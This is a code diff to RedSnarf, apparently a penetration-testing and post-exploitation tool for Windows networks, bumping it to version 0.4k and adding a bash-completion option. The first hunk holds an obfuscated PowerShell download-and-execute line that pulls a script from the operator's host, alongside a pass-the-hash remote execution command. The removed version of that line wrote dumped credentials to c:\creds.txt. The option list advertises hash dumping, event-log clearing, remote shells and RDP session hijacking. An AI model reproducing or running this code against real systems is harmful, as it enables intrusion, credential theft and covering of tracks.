@@ -1146,7 +1146,7 @@ def datadump(user, passw, host, path, os_version):
 								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
 						
 						#Prepare string
-						line = "iex ((New-Object System.Net.WebClient).DownloadString('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"castell"+randint(1,50)*x+" -Dwmp > c:\\creds.txt"
+						line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"castell"+randint(1,50)*x+" -Command \"ts::multirdp\""
 					else:
 						line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"castell"+randint(1,50)*x+" -Command \"ts::multirdp\""
 					
@@ -1857,7 +1857,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.4j", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.4k", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -1873,6 +1873,7 @@ cgroup.add_argument("-cQ", "--quick_validate", dest="quick_validate", default="n
 cgroup.add_argument("-cS", "--skiplsacache", dest="skiplsacache", default="n", help="<Optional> Enter y to skip dumping lsa and cache and go straight to hashes!!")
 # Utilities
 ugroup = p.add_argument_group('Utilities')
+ugroup.add_argument("-uA", "--auto_complete", dest="auto_complete", default="n", help="<Optional> Copy autocomplete file to /etc/bash_completion.d ")
 ugroup.add_argument("-uC", "--clear_event", dest="clear_event", default="n", help="<Optional> Clear event log - application, security, setup or system")
 ugroup.add_argument("-uCIDR", "--cidr", dest="cidr", default="", help="<Optional> Convert CIDR representation to ip, hostmask, broadcast")
 ugroup.add_argument("-uD", "--dropshell", dest="dropshell", default="n", help="<Optional> Enter y to Open up a shell on the remote machine")
@@ -1890,7 +1891,7 @@ ugroup.add_argument("-uR", "--multi_rdp", dest="multi_rdp", default="n", help="<
 ugroup.add_argument("-uRP", "--rdp_connect", dest="rdp_connect", default="n", help="<Optional> Connect to existing RDP sessions without password")
 ugroup.add_argument("-uS", "--get_spn", dest="get_spn", default="n", help="<Optional> Get SPN's from DC")
 ugroup.add_argument("-uSS", "--split_spn", dest="split_spn", default="n", help="<Optional> Split SPN File")
-ugroup.add_argument("-uU", "--unattend", dest="unattend", default="n", help="<Optional> Enter y to look for and grap unattended installation files")
+ugroup.add_argument("-uU", "--unattend", dest="unattend", default="n", help="<Optional> Enter y to look for and grep unattended installation files")
 ugroup.add_argument("-uX", "--xcommand", dest="xcommand", default="n", help="<Optional> Run custom command")
 ugroup.add_argument("-uW", "--wifi_credentials", dest="wifi_credentials", default="n", help="<Optional> Grab Wifi Credentials")
 # Hash related
@@ -1995,6 +1996,17 @@ cidr=args.cidr
 liveips=args.liveips
 split_spn=args.split_spn
 sendspntojohn=args.sendspntojohn
+auto_complete=args.auto_complete
+
+if args.auto_complete!='n':
+	print colored("[+]Copying redsnarf.rc to /etc/bash_completion.d",'green')
+	os.system("cp redsnarf.rc /etc/bash_completion.d/redsnarf.rc")
+	if os.path.isfile("/etc/bash_completion.d/redsnarf.rc"):
+		print colored("[+]File copied, now open a new bash window",'yellow')
+		os.system("exec bash")
+	else:
+		print colored("[-]File not copied",'yellow')
+	sys.exit()
 
 #Work around for if a password has !! as the command line will bork
 if args.password=='epass':
